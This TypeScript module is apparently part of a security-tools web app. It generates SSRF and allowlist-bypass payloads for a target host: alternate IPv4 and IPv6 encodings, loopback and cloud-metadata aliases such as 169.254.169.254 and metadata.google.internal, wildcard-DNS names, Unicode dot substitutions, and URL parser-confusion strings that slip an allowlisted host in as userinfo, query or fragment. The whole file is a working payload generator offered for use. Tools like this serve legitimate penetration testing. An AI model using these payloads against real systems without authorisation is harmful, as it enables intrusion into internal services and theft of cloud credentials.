// ─── SSRF / allowlist bypass formats ─────────────────────────────────────────
// One destination, every spelling of it a parser might accept. The bug this
// tool exercises is always the same: the code that decides whether a host is
// allowed and the code that finally opens the socket do not parse the string
// the same way. `inet_aton` takes octal and dwords, WHATWG takes backslashes
// and userinfo, IDNA folds three different full stops down to one.

import { expandIpv6, compressIpv6 } from '@/Components/Functions/NetworkTools/logic';

export type Section = 'ip' | 'alias' | 'host' | 'url';

export const SECTION_TITLES: Record<Section, string> = {
  ip: 'Address formats',
  alias: 'Same destination, other names',
  host: 'Host string mangling',
  url: 'URL parser confusion',
};

export const ALL_SECTIONS: Section[] = ['ip', 'alias', 'host', 'url'];

export type Variant = {
  section: Section;
  label: string;
  /** The host token on its own, before it is put back into the URL. */
  host: string;
  /** Set when the payload is a whole URL rather than a host substitution. */
  raw?: string;
  note?: string;
};

export type TargetKind = 'ipv4' | 'ipv6' | 'host';

export type ParsedTarget = {
  /** Empty when the input was a bare address or hostname. */
  scheme: string;
  userinfo: string;
  host: string;
  port: string;
  /** Path, query and fragment, kept verbatim so payloads stay usable. */
  rest: string;
};

export const DEFAULT_ALLOWED = 'allowed.example.com';

// ─── Parsing ─────────────────────────────────────────────────────────────────

export function parseTarget(raw: string): ParsedTarget {
  let text = raw.trim();
  if (!text) throw new Error('Enter an address, hostname or URL');

  let scheme = '';
  const schemeMatch = text.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):\/\//);
  if (schemeMatch) {
    scheme = schemeMatch[1].toLowerCase();
    text = text.slice(schemeMatch[0].length);
  }

  // The authority ends at the first delimiter; everything after it rides along
  // untouched so a path worth attacking survives into every payload.
  const cut = text.search(/[/?#]/);
  let authority = cut === -1 ? text : text.slice(0, cut);
  const rest = cut === -1 ? '' : text.slice(cut);

  let userinfo = '';
  const at = authority.lastIndexOf('@');
  if (at !== -1) {
    userinfo = authority.slice(0, at);
    authority = authority.slice(at + 1);
  }

  let host = authority;
  let port = '';
  if (host.startsWith('[')) {
    const close = host.indexOf(']');
    if (close === -1) throw new Error('Unclosed "[" in the address');
    const after = host.slice(close + 1);
    host = host.slice(1, close);
    if (after.startsWith(':')) port = after.slice(1);
    else if (after) throw new Error(`Cannot read "${after}" after the address`);
  } else if ((host.match(/:/g) ?? []).length > 1) {
    // A bare IPv6 literal: every colon belongs to the address, none to a port.
  } else {
    const colon = host.lastIndexOf(':');
    if (colon !== -1 && /^\d+$/.test(host.slice(colon + 1))) {
      port = host.slice(colon + 1);
      host = host.slice(0, colon);
    }
  }

  if (!host) throw new Error('No host found in that input');
  return { scheme, userinfo, host, port, rest };
}

const DOTTED = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;

/** Dotted quad or a bare dword, the two spellings a user is likely to paste. */
export function toIpv4Int(host: string): number | null {
  const dotted = host.match(DOTTED);
  if (dotted) {
    let value = 0;
    for (let i = 1; i <= 4; i++) {
      const octet = Number(dotted[i]);
      if (octet > 255) return null;
      value = value * 256 + octet;
    }
    return value >>> 0;
  }
  if (/^\d+$/.test(host)) {
    const value = Number(host);
    if (Number.isSafeInteger(value) && value >= 0 && value <= 0xffffffff) return value >>> 0;
  }
  return null;
}

export function intToIpv4(value: number): string {
  return [24, 16, 8, 0].map((shift) => (value >>> shift) & 0xff).join('.');
}

export function classifyTarget(host: string): TargetKind {
  if (toIpv4Int(host) !== null) return 'ipv4';
  if (host.includes(':')) return 'ipv6';
  return 'host';
}

// ─── Address descriptions ────────────────────────────────────────────────────

export function describeIpv4(value: number): string {
  const [a, b, c] = [24, 16, 8].map((shift) => (value >>> shift) & 0xff);
  if (a === 127) return 'loopback (127.0.0.0/8)';
  if (a === 0) return 'this network (0.0.0.0/8) — reaches loopback on many stacks';
  if (a === 169 && b === 254) {
    return value === 0xa9fea9fe
      ? 'cloud instance metadata (169.254.169.254)'
      : 'link-local (169.254.0.0/16)';
  }
  if (a === 10) return 'private (10.0.0.0/8)';
  if (a === 172 && b >= 16 && b <= 31) return 'private (172.16.0.0/12)';
  if (a === 192 && b === 168) return 'private (192.168.0.0/16)';
  if (a === 100 && b >= 64 && b <= 127) return 'carrier-grade NAT (100.64.0.0/10)';
  if (a === 192 && b === 0 && c === 0) return 'IETF protocol assignments (192.0.0.0/24)';
  if (a >= 224) return 'multicast or reserved';
  return 'public address';
}

/** Whether the destination is one an allowlist is usually there to protect. */
export function isInternalIpv4(value: number): boolean {
  const [a, b] = [24, 16].map((shift) => (value >>> shift) & 0xff);
  if (a === 127 || a === 0 || a === 10) return true;
  if (a === 169 && b === 254) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  if (a === 100 && b >= 64 && b <= 127) return true;
  if (a === 192 && b === 0) return true;
  return false;
}

export function isInternalIpv6(host: string): boolean {
  const expanded = expandIpv6(host);
  if (/^0000:0000:0000:0000:0000:0000:0000:0001$/.test(expanded)) return true;
  return /^f[cd]/.test(expanded) || /^fe[89ab]/.test(expanded);
}

const LOOPBACK_ALIASES = [
  { label: 'localhost', host: 'localhost' },
  { label: 'Unspecified', host: '0.0.0.0', note: 'binds and connects to loopback on Linux' },
  { label: 'Bare zero', host: '0', note: 'inet_aton reads 0 as 0.0.0.0' },
  { label: 'IPv6 loopback', host: '::1' },
  { label: 'IPv6 unspecified', host: '::' },
  { label: 'Wildcard DNS', host: 'localtest.me', note: 'public DNS record pointing at 127.0.0.1' },
];

const METADATA_ALIASES = [
  { label: 'GCE metadata', host: 'metadata.google.internal' },
  { label: 'GCE short name', host: 'metadata', note: 'resolves via the search domain inside GCE' },
  { label: 'EC2 IPv6 metadata', host: 'fd00:ec2::254' },
  { label: 'Alibaba metadata', host: '100.100.100.200' },
  { label: 'Oracle metadata', host: '192.0.0.192' },
];

// ─── Variant builders ────────────────────────────────────────────────────────

const toOctet = (value: number, shift: number) => (value >>> shift) & 0xff;

function ipv4Variants(value: number): Variant[] {
  const [a, b, c, d] = [24, 16, 8, 0].map((shift) => toOctet(value, shift));
  const dotted = `${a}.${b}.${c}.${d}`;
  const octal = (n: number) => `0${n.toString(8).padStart(3, '0')}`;
  const hex = (n: number) => `0x${n.toString(16).padStart(2, '0')}`;

  return [
    { section: 'ip', label: 'Dotted decimal', host: dotted },
    { section: 'ip', label: 'Decimal', host: String(value) },
    {
      section: 'ip',
      label: 'Decimal overflow',
      host: String(value + 0x100000000),
      note: 'inet_addr truncates to 32 bits; stricter parsers reject it',
    },
    { section: 'ip', label: 'Octal', host: [a, b, c, d].map(octal).join('.') },
    { section: 'ip', label: 'Octal dword', host: `0${value.toString(8)}` },
    { section: 'ip', label: 'Hex', host: `0x${value.toString(16).padStart(8, '0')}` },
    { section: 'ip', label: 'Dotted hex', host: [a, b, c, d].map(hex).join('.') },
    { section: 'ip', label: 'Mixed hex/decimal', host: `${hex(a)}.${value & 0xffffff}` },
    {
      section: 'ip',
      label: 'Two-part (class A)',
      host: `${a}.${value & 0xffffff}`,
      note: 'inet_aton spreads the last part over the remaining octets',
    },
    { section: 'ip', label: 'Three-part (class B)', host: `${a}.${b}.${value & 0xffff}` },
    { section: 'ip', label: 'IPv4-mapped IPv6', host: `::ffff:${dotted}` },
    {
      section: 'ip',
      label: 'IPv4-mapped (hex)',
      host: `::ffff:${((value >>> 16) & 0xffff).toString(16)}:${(value & 0xffff).toString(16)}`,
    },
    { section: 'ip', label: 'IPv4-compatible', host: `::${dotted}` },
    {
      section: 'ip',
      label: 'IPv6 expanded',
      host: `0000:0000:0000:0000:0000:ffff:${((value >>> 16) & 0xffff)
        .toString(16)
        .padStart(4, '0')}:${(value & 0xffff).toString(16).padStart(4, '0')}`,
    },
    {
      section: 'ip',
      label: 'NAT64',
      host: `64:ff9b::${dotted}`,
      note: 'reaches the IPv4 address through a NAT64 gateway',
    },
  ];
}

function ipv4Aliases(value: number): Variant[] {
  const dotted = intToIpv4(value);
  const dashed = dotted.replace(/\./g, '-');
  const hex = value.toString(16).padStart(8, '0');
  const out: Variant[] = [];

  const a = toOctet(value, 24);
  if (a === 127 || a === 0) {
    for (const alias of LOOPBACK_ALIASES) {
      if (alias.host === dotted) continue;
      out.push({ section: 'alias', ...alias });
    }
  }
  if (value === 0xa9fea9fe) {
    for (const alias of METADATA_ALIASES) out.push({ section: 'alias', ...alias });
  }

  out.push(
    { section: 'alias', label: 'nip.io', host: `${dotted}.nip.io`, note: 'wildcard DNS resolving to the address in the name' },
    { section: 'alias', label: 'nip.io dashed', host: `${dashed}.nip.io` },
    { section: 'alias', label: 'nip.io hex', host: `${hex}.nip.io` },
    { section: 'alias', label: 'sslip.io', host: `${dotted}.sslip.io` },
    { section: 'alias', label: 'sslip.io dashed', host: `${dashed}.sslip.io` },
  );
  return out;
}

/** Rewrites the separators an IDNA-normalising parser folds back to ".". */
function dotVariants(host: string, section: Section): Variant[] {
  if (!host.includes('.')) return [];
  return [
    { section, label: 'Trailing dot', host: `${host}.`, note: 'the fully qualified form; string allowlists miss it' },
    { section, label: 'Ideographic dots', host: host.replace(/\./g, '。'), note: 'U+3002, folded to "." by IDNA' },
    { section, label: 'Fullwidth dots', host: host.replace(/\./g, '．'), note: 'U+FF0E' },
    { section, label: 'Halfwidth dots', host: host.replace(/\./g, '｡'), note: 'U+FF61' },
    { section, label: 'Encoded dots', host: host.replace(/\./g, '%2e') },
    { section, label: 'Double-encoded dots', host: host.replace(/\./g, '%252e') },
  ];
}

function hostnameVariants(host: string): Variant[] {
  const alternating = [...host]
    .map((ch, i) => (i % 2 ? ch.toLowerCase() : ch.toUpperCase()))
    .join('');
  const out: Variant[] = [
    { section: 'host', label: 'As given', host },
    { section: 'host', label: 'Uppercase', host: host.toUpperCase() },
    { section: 'host', label: 'Alternating case', host: alternating },
  ];
  out.push(...dotVariants(host, 'host'));
  return out;
}

function hostnameAliases(host: string): Variant[] {
  if (!/^localhost\.?$/i.test(host)) return [];
  return [
    { section: 'alias', label: 'Loopback', host: '127.0.0.1' },
    { section: 'alias', label: 'Loopback decimal', host: '2130706433' },
    { section: 'alias', label: 'Loopback short', host: '127.1' },
    { section: 'alias', label: 'IPv6 loopback', host: '::1' },
    { section: 'alias', label: 'Bare zero', host: '0' },
  ];
}

function ipv6Variants(host: string): Variant[] {
  const expanded = expandIpv6(host);
  const out: Variant[] = [
    { section: 'ip', label: 'As given', host },
    { section: 'ip', label: 'Compressed', host: compressIpv6(host) },
    { section: 'ip', label: 'Expanded', host: expanded },
    {
      section: 'ip',
      label: 'Uppercase',
      host: expanded.toUpperCase(),
      note: 'case-sensitive string allowlists miss it',
    },
  ];
  const groups = expanded.split(':');
  if (groups.length === 8) {
    const trimmed = groups.map((g) => g.replace(/^0+/, '') || '0').join(':');
    out.push({ section: 'ip', label: 'Unpadded groups', host: trimmed });
  }
  return out;
}

function ipv6Aliases(host: string): Variant[] {
  const expanded = expandIpv6(host);
  if (/^0000:0000:0000:0000:0000:0000:0000:0001$/.test(expanded)) {
    return LOOPBACK_ALIASES.filter((a) => a.host !== '::1').map((a) => ({ section: 'alias' as const, ...a }));
  }
  return [];
}

// ─── URL parser confusion ────────────────────────────────────────────────────

function urlVariants(target: ParsedTarget, allowed: string): Variant[] {
  const scheme = target.scheme || 'http';
  const host = target.host.includes(':') ? `[${target.host}]` : target.host;
  const authority = `${host}${target.port ? `:${target.port}` : ''}`;
  const tail = `${authority}${target.rest}`;

  const payload = (raw: string, label: string, note?: string): Variant => ({
    section: 'url',
    label,
    host: target.host,
    raw,
    note,
  });

  return [
    payload(`${scheme}://${allowed}@${tail}`, 'Userinfo', 'everything before the last @ is credentials, not a host'),
    payload(`${scheme}://${allowed}:@${tail}`, 'Userinfo, empty password'),
    payload(`${scheme}://${allowed}@@${tail}`, 'Double @', 'splits differently in parsers that take the first @'),
    payload(`${scheme}://${allowed}\\@${tail}`, 'Backslash', 'WHATWG treats \\ as /, RFC 3986 does not'),
    payload(`${scheme}://${allowed}#@${tail}`, 'Fragment before @'),
    payload(`${scheme}://${allowed}?@${tail}`, 'Query before @'),
    payload(`${scheme}://${allowed}%40${tail}`, 'Encoded @', 'decoded after the allowlist check by some clients'),
    payload(`${scheme}:/${tail}`, 'Single slash', 'accepted by WHATWG parsers and curl'),
    payload(`${scheme}:///${tail}`, 'Triple slash'),
    payload(`//${tail}`, 'Scheme-relative'),
    payload(`${scheme.toUpperCase()}://${tail}`, 'Uppercase scheme'),
    payload(`${scheme}://${tail}${target.rest.includes('?') ? '&' : '?'}host=${allowed}`, 'Allowed host in query', 'for checks that only call includes()'),
    payload(`${scheme}://${tail}#${allowed}`, 'Allowed host in fragment'),
  ];
}

// ─── Assembly ────────────────────────────────────────────────────────────────

export type BypassOptions = {
  /** The host the allowlist expects, used by the URL parser-confusion payloads. */
  allowed?: string;
  sections?: Section[];
};

export type BypassResult = {
  target: ParsedTarget;
  kind: TargetKind;
  canonical: string;
  description: string;
  /** The destination sits in a range an allowlist normally guards. */
  internal: boolean;
  allowed: string;
  variants: Variant[];
};

/** Puts a host token back into whatever shape the input came in as. */
export function renderWithHost(target: ParsedTarget, host: string, forceScheme = false): string {
  const bracketed = host.includes(':') && !host.startsWith('[') ? `[${host}]` : host;
  const authority = `${target.userinfo ? `${target.userinfo}@` : ''}${bracketed}${
    target.port ? `:${target.port}` : ''
  }`;
  if (!target.scheme && !forceScheme) return `${authority}${target.rest}`;
  return `${target.scheme || 'http'}://${authority}${target.rest}`;
}

export function bypassPayloads(input: string, options: BypassOptions = {}): BypassResult {
  const target = parseTarget(input);
  const kind = classifyTarget(target.host);
  const sections = options.sections?.length ? options.sections : ALL_SECTIONS;
  const allowed = (options.allowed || '').trim() || DEFAULT_ALLOWED;

  let canonical = target.host;
  let description: string;
  let internal: boolean;
  const variants: Variant[] = [];

  if (kind === 'ipv4') {
    const value = toIpv4Int(target.host) as number;
    canonical = intToIpv4(value);
    description = describeIpv4(value);
    internal = isInternalIpv4(value);
    variants.push(...ipv4Variants(value), ...ipv4Aliases(value), ...dotVariants(canonical, 'host'));
  } else if (kind === 'ipv6') {
    canonical = compressIpv6(target.host);
    description = /^::1$/.test(canonical) ? 'IPv6 loopback' : 'IPv6 address';
    internal = isInternalIpv6(target.host);
    variants.push(...ipv6Variants(target.host), ...ipv6Aliases(target.host));
  } else {
    description = /^localhost\.?$/i.test(target.host) ? 'loopback by name' : 'hostname';
    internal = /^localhost\.?$/i.test(target.host);
    variants.push(...hostnameVariants(target.host), ...hostnameAliases(target.host));
  }

  variants.push(...urlVariants(target, allowed));

  const wanted = new Set(sections);
  const seen = new Set<string>();
  const kept: Variant[] = [];
  for (const variant of variants) {
    if (!wanted.has(variant.section)) continue;
    const value = variant.raw ?? renderWithHost(target, variant.host);
    if (seen.has(value)) continue;
    seen.add(value);
    kept.push(variant);
  }

  return { target, kind, canonical, description, internal, allowed, variants: kept };
}

/** The payload string for one variant, in the shape the input arrived in. */
export function payloadFor(target: ParsedTarget, variant: Variant): string {
  return variant.raw ?? renderWithHost(target, variant.host);
}

export function formatBypassResult(result: BypassResult, labelled = true): string {
  const payloads = result.variants.map((v) => payloadFor(result.target, v));
  if (!labelled) return payloads.join('\n');

  const width = Math.max(...result.variants.map((v) => v.label.length), 0) + 2;
  const lines = [`# ${result.canonical} — ${result.description}`];

  let open: Section | null = null;
  result.variants.forEach((variant, index) => {
    const current = variant.section;
    if (current !== open) {
      open = current;
      const title = SECTION_TITLES[current];
      lines.push('', current === 'url' ? `## ${title} (allowlisted host: ${result.allowed})` : `## ${title}`);
    }
    lines.push(`${variant.label.padEnd(width)}${payloads[index]}`);
    if (variant.note) lines.push(`${' '.repeat(width)}↳ ${variant.note}`);
  });

  return lines.join('\n');
}

/** The pipeline form: one target in, bare payloads out, one per line. */
export function bypassPayloadsText(input: string, allowed?: string, sections?: Section[]): string {
  const targets = input
    .split('\n')
    .map((line) => line.trim())
    .filter(Boolean);
  if (targets.length === 0) throw new Error('Enter an address, hostname or URL');
  return targets
    .map((target) => formatBypassResult(bypassPayloads(target, { allowed, sections }), false))
    .join('\n');
}

export const SSRF_SAMPLE = 'http://127.0.0.1:8080/admin';
